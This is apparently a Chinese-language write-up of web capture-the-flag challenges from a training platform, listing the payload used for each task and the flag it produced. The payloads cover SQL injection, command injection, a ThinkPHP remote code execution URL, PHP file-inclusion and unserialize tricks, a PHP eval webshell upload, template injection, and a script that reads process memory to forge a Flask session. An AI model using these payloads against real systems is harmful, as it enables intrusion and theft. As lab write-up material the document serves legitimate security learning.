
## 难度 1
### view_source

```shell
$ curl -i "http://61.147.171.105:49608/"
HTTP/1.1 200 OK
Date: Fri, 27 Dec 2024 05:38:52 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Vary: Accept-Encoding
Content-Length: 345
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Where is the FLAG</title>
</head>
<body>
<script>
document.oncontextmenu=new Function("return false")
document.onselectstart=new Function("return false")
</script>


<h1>FLAG is not here</h1>


<!-- cyberpeace{8c1f3a789e0b78a5ce96904733cc1750} -->

</body>
</html>

```

flag: `cyberpeace{8c1f3a789e0b78a5ce96904733cc1750}`

### robots

访问 `robots.txt`

```
User-agent: *
Disallow: 
Disallow: f1ag_1s_h3re.php
```

flag: `cyberpeace{4dcaf82813c9f3103b00d476c74c6e94}`

### backup

```shell
$ curl "http://61.147.171.105:56320/index.php.bak"
<html>
<head>
    <meta charset="UTF-8">
    <title>备份文件</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>你知道index.php的备份文件名吗？</h3>
<?php
$flag="Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}"
?>
</body>
</html>

```

flag: `Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}`

### cookie

```shell
$ curl -i "http://61.147.171.105:60691/"
HTTP/1.1 200 OK
Date: Fri, 27 Dec 2024 05:44:50 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Set-Cookie: look-here=cookie.php
Vary: Accept-Encoding
Content-Length: 417
Content-Type: text/html

<html>
<head>
    <meta charset="UTF-8">
    <title>Cookie</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>你知道什么是cookie吗？</h3>
</body>
</html>

$ curl -i "http://61.147.171.105:60691/cookie.php"
HTTP/1.1 200 OK
Date: Fri, 27 Dec 2024 05:45:01 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
flag: cyberpeace{cd449c1431f8a961637ddfeea9848df2}
Vary: Accept-Encoding
Content-Length: 411
Content-Type: text/html

<html>
<head>
    <meta charset="UTF-8">
    <title>Cookie</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>See the http response</h3>
</body>
</html>

```

flag: `cyberpeace{cd449c1431f8a961637ddfeea9848df2}`

### disabled_button

```shell
$ curl -X POST -d "auth=flag" "http://61.147.171.105:57133/"
<html>
<head>
    <meta charset="UTF-8">
    <title>一个不能按的按钮</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>一个不能按的按钮</h3>

<form action="" method="post" >
<input disabled class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth" />
</form>
<h3>cyberpeace{bb43ef404e6e050d9a7b013262fa82df}</h3>
</body>
</html>

```

flag: `cyberpeace{bb43ef404e6e050d9a7b013262fa82df}`

### get_post

```shell
$ curl POST -d "b=2" "http://61.147.171.105:57486/?a=1"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>POST&GET</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />

</head>
<body>

<h1>请用GET方式提交一个名为a,值为1的变量</h1>

<h1>请再以POST方式随便提交一个名为b,值为2的变量</h1><h1>cyberpeace{ad6bd2612867a70492cf42d9fef1e327}</h1>
</body>
</html>

```

flag: `cyberpeace{ad6bd2612867a70492cf42d9fef1e327}`

### weak_auth

密码 123456

flag: `cyberpeace{f94b3923f21b643912ef43a012955bea}`

### simple_php

```
http://61.147.171.105:53421/?a=[]&b=1235a
```

flag: `Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}`

### Training-WWW-Robots

flag: `cyberpeace{c4cc8324c5612db50f8cf412c9f80738}`

### baby_web

```shell
$ curl -i "http://61.147.171.105:53670/"
HTTP/1.1 302 Found
Date: Fri, 27 Dec 2024 06:37:30 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.21
FLAG: flag{very_baby_web}
Location: 1.php
Content-Length: 17
Content-Type: text/html; charset=UTF-8

Flag is hidden!

```

flag: `flag{very_baby_web}`

### php2

```
http://61.147.171.105:61732/index.phps
```

url encode 两次

```
http://61.147.171.105:61732/index.php?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```

flag: `cyberpeace{cdb0580a766823b8068b1990cc82d7b2}`

### ics-06

```
http://61.147.171.105:65141/index.php?id=2333
```

flag: `cyberpeace{7e0db468f29382a830c815a71a04a981}`

### unserialize3

```
http://61.147.171.105:65187/?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```

。。。不是很懂

flag: `cyberpeace{7ce8124eee9dd3555f9bad0145c1e1e6}`

### inget

```
http://61.147.171.105:59251/?id=1' or 1='1
```

flag: `cyberpeace{041fcebccab3077b3758e05b07cb2473}`

### fileclude

```shell
$ curl POST -d "hello ctf" "http://61.147.171.105:54999/?file2=php://input&file1=php://filter/read=convert.base64-encode/resource=flag.php"
WRONG WAY!<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #007700">include(</span><span style="color: #DD0000">"flag.php"</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />if(isset(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"file1"</span><span style="color: #007700">])&nbsp;&amp;&amp;&nbsp;isset(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"file2"</span><span style="color: #007700">]))<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$file1&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"file1"</span><span style="color: #007700">];<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$file2&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"file2"</span><span style="color: #007700">];<br />&nbsp;&nbsp;&nbsp;&nbsp;if(!empty(</span><span style="color: #0000BB">$file1</span><span style="color: #007700">)&nbsp;&amp;&amp;&nbsp;!empty(</span><span style="color: #0000BB">$file2</span><span style="color: #007700">))<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$file2</span><span style="color: #007700">)&nbsp;===&nbsp;</span><span style="color: #DD0000">"hello&nbsp;ctf"</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style="color: #0000BB">$file1</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die(</span><span style="color: #DD0000">"NONONO"</span><span style="color: #007700">);<br />}</span>
</span>
</code>PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXs1NDdmYzQ5M2UzMjRmNjcwNTBkZTEwMDI2NjQ5ZmI4Nn0=

$ echo "PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXs1NDdmYzQ5M2UzMjRmNjcwNTBkZTEwMDI2NjQ5ZmI4Nn0=" | base64 -d
<?php
echo "WRONG WAY!";
// $flag = cyberpeace{547fc493e324f67050de10026649fb86}
```

flag: `cyberpeace{547fc493e324f67050de10026649fb86}`

### fileinclude

添加 cookie:

```
language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag
```

flag: `cyberpeace{b00d522e6523361dd939401e7b1e2444}`

### file_include

```shell
$ curl "http://61.147.171.105:63732/?filename=php://filter/convert.iconv.UTF-8.UTF-7/resource=./flag.php"
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style="color: #DD0000">"./check.php"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;if(isset(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'filename'</span><span style="color: #007700">])){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$filename&nbsp;&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'filename'</span><span style="color: #007700">];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /></span><span style="color: #0000BB">?&gt;<br /></span>
</span>
</code>+ADw?php
+ACQ-flag+AD0'cyberpeace+AHs-2bc2a31870c55639d834b8c865806994+AH0'+ADs

$ iconv -f 'utf-7' -t 'utf-8' << EOF
+ADw?php +ACQ-flag+AD0'cyberpeace+AHs-2bc2a31870c55639d834b8c865806994+AH0'+ADs
EOF

<?php $flag='cyberpeace{2bc2a31870c55639d834b8c865806994}';
```

flag: `cyberpeace{2bc2a31870c55639d834b8c865806994}`

### easyphp

```
http://61.147.171.105:49727/?a=9e9&b=bDIOS&c={"m":"2023a","n":[[],0]}
```

flag: `cyberpeace{f675ccdb33fbae4237a47cf8a91cdf7a}`

### easyupload

```http
------WebKitFormBoundaryhTApMVmLfO50Detu
Content-Disposition: form-data; name="fileUpload"; filename=".user.ini"
Content-Type: image/gif

GIF89a
auto_prepend_file=a.jpg

------WebKitFormBoundaryhTApMVmLfO50Detu
```

flag: `cyberpeace{433a0b30c58b31ee8d3bd3f601e1b140}`

### unseping

```php
<?php

class ease {
    private $method;
    private $args;

    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
}

$e = new ease("ping", ['ca""t${IFS}fl""ag_1s_here$(printf${IFS}"\057")fl""ag_831b69012c67b35f.ph""p']);

echo base64_encode(serialize($e));
?>
```

flag: `cyberpeace{4aeb49483011d8e30d982573edd300c5}`

## 难度 2

### command_execution

```
target=127.0.0.1;grep -r "cyberpeace" /
```

flag: `cyberpeace{6f845a5b8b4ea9e965f4459c1ffb7ae5}`

### xff_referer

```shell
$ curl -H "Referer: https://www.google.com" -H "X-Forwarded-For: 123.123.123.123" "http://61.147.171.105:54676/"
<html>
<head>
    <meta charset="UTF-8">
    <title>index</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<p id="demo">ip地址必须为123.123.123.123</p>
<script>document.getElementById("demo").innerHTML="必须来自https://www.google.com";</script><script>document.getElementById("demo").innerHTML="cyberpeace{242e898a3e5921739cd994a45e805b62}";</script></body>
</html>
```

flag: `cyberpeace{242e898a3e5921739cd994a45e805b62}`

### php-rce

```
http://61.147.171.105:57866/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag
```

flag: `flag{thinkphp5_rce}`

### Web_php_include

```
http://61.147.171.105:56692/?page=data://text/plain,<?php echo `base64 fl4gisisish3r3.php` ?>
```

flag: `ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}`

### upload1

```http
------WebKitFormBoundaryYBxVsEzIO8C3R6nQ
Content-Disposition: form-data; name="upfile"; filename="x.php"
Content-Type: image/jpeg

<?php eval($_GET['x']) ?>
------WebKitFormBoundaryYBxVsEzIO8C3R6nQ--
```

flag: `cyberpeace{37168f805d005841bc25086834371862}`

### warmup

我只能说 wtf

```
http://61.147.171.105:57169/?file=source.php?../../../../../ffffllllaaaagggg
```

flag: `flag{25e7bce6005c4e0c983fb97297ac6e5a}`

### NewsCenter

题坏了

### Web_php_unserialize

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}

$d = new Demo('fl4g.php');
$s = serialize($d);
$s = str_replace('O:4:"Demo"', 'O:+4:"Demo"', $s);
$s = str_replace('"Demo":1:', '"Demo":2:', $s);
echo $s . "\n";
echo base64_encode($s) . "\n";

?>
```

flag: `ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}`

### web2

```python
import base64
import codecs

s = "a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";

s = codecs.decode(s, 'rot_13')
s = s[::-1]
s = base64.b64decode(s).decode('utf-8')
s = "".join([chr(ord(i) - 1) for i in s])
s = s[::-1]

print(s)
```

flag: `flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}`

### Web_python_template_inejction

```
http://61.147.171.105:54330/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}
```

flag: `ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}`

### catcat-new

```
http://61.147.171.105:65197/info?file=../app.py
```

```python
import os
import uuid
from flask import Flask, request, session, render_template, Markup
from cat import cat

flag = ""
app = Flask(
    __name__,
    static_url_path='/', 
    static_folder='static' 
)
app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
if os.path.isfile("/flag"):
    flag = cat("/flag")
    os.remove("/flag")

@app.route('/', methods=['GET'])
def index():
    detailtxt = os.listdir('./details/')
    cats_list = []
    for i in detailtxt:
        cats_list.append(i[:i.index('.')])
 
 return render_template("index.html", cats_list=cats_list, cat=cat)

@app.route('/info', methods=["GET", 'POST'])
def info():
    filename = "./details/" + request.args.get('file', "")
    start = request.args.get('start', "0")
    end = request.args.get('end', "0")
    name = request.args.get('file', "")[:request.args.get('file', "").index('.')]

    return render_template("detail.html", catname=name, info=cat(filename, start, end))
 


@app.route('/admin', methods=["GET"])
def admin_can_list_root():
    if session.get('admin') == 1:
        return flag
    else:
        session['admin'] = 0
    return "NoNoNo"



if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False, port=5637)
```

然后就是读内存分布，然后模式匹配了

```python
import requests
import re
import dataclasses

@dataclasses.dataclass
class entry:
    start: str
    end: str
    permission: str

def main() -> None:
    maps_resp = requests.get('http://61.147.171.105:52143/info?file=../../../../../../proc/self/maps')
    maps = re.search(r'<p>(.*)</p>', maps_resp.text).group(1)
    matches = re.findall(r'([0-9a-f]{12})-([0-9a-f]{12}) ([-rwxp]{4})', maps)
    entries = [entry(start, end, permission) for start, end, permission in matches]
    
    for e in entries:
        if 'r' in e.permission and 'w' in e.permission:
            start_addr, end_addr = int(e.start, 16), int(e.end, 16)
            
            mem_resp = requests.get(f'http://61.147.171.105:52143/info?file=../../../../../../proc/self/mem&start={start_addr}&end={end_addr}')
            mem = re.search(r'<p>(.*)</p>', mem_resp.text).group(1)
            matches = re.search(r'[a-f0-9]{32}\*abcdefgh', mem)
            if matches:
                print(f"Found in {e}")
                print(f"Secret key: {matches.group(0)}")
                break
            

if __name__ == '__main__':
    main()
```

```shell
$ python3 main.py      
Found in entry(start='7fc49d4bd000', end='7fc49d5f7000', permission='rw-p')
Secret key: 8566ab45fb1249688ab31f8b0a00083f*abcdefgh
```

然后就是 session 伪造，工具一把梭：

```shell
$ flask-session-cookie-manager3 encode -s '8566ab45fb1249688ab31f8b0a00083f*abcdefgh' -t '{"admin":1}'
eyJhZG1pbiI6MX0.Z4o6dw.KreVENRWnKHCnu0xvrpIzN8U79E

$ curl -H 'Cookie: session=eyJhZG1pbiI6MX0.Z4o6dw.KreVENRWnKHCnu0xvrpIzN8U79E' 'http://61.147.171.105:52143/admin'
catctf{Catch_the_c4t_HaHa}
```

flag: `catctf{Catch_the_c4t_HaHa}`

### simple_js

。。。

```python
s: str = '\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30'

ans: str = ''.join([chr(int(_)) for _ in s.split(',')])

print(ans)
```

flag: `Cyberpeace{786OsErtk12}`